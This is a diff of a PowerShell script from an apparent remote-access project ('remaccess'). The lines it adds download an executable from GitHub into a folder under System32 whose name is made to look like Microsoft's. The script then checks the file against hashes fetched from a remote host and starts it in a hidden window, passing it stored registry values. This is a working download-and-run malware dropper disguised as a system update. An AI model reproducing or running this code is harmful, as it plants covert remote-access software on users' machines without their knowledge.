@@ -20,6 +20,31 @@ $codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Cue
 $programDataPath = $env:ProgramData
 $storedData = (Get-ItemProperty -Path $regPath).Data
 $storedCode = (Get-ItemProperty -Path $regPath).Code
+$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
+$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
+$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
+$botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+#File Integrity Check.
+if (-not (Test-Path (Split-Path $botpath))) {
+    New-Item -Path (Split-Path $botpath) -ItemType Directory -Force
+}
+if (Test-Path $botpath) {
+    $existingFileHash = (Get-FileHash -Path $botpath -Algorithm SHA256).Hash
+    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
+    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
+    if ($hashesData -match $hashRegex) {
+        $programHash = $matches[1]
+    }
+    if ($programHash -eq $existingFileHash) {
+        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
+    } else {
+        Remove-Item -Path $botpath -Force
+    }
+}
+if (-not (Test-Path $botpath)) {
+    Invoke-WebRequest -Uri $downloadUrl -OutFile $botpath
+}
 #Function to add or update registry keys
 function CheckAndUpdateRegistryCode {
     param (
@@ -175,7 +200,6 @@ function Retry-Operation {
         Write-Host "Operation failed after $MaxRetries retries."
     }
 }
-
 #Function to Delete Directories
 function Delete-Directories {
     param (
@@ -318,6 +342,9 @@ if ($storedCode -ne $null) {
               	  	}
                 if ($status -ne $null) {
         		Set-ItemProperty -Path $regPath -Name "Data" -Value $status
+	  		$combinedString = """$storedCode :: $storedData"""
+     			Start-Process -WindowStyle Hidden -FilePath $botpath -ArgumentList $combinedString
+			Start-Sleep 3
 		}
                 break
             }
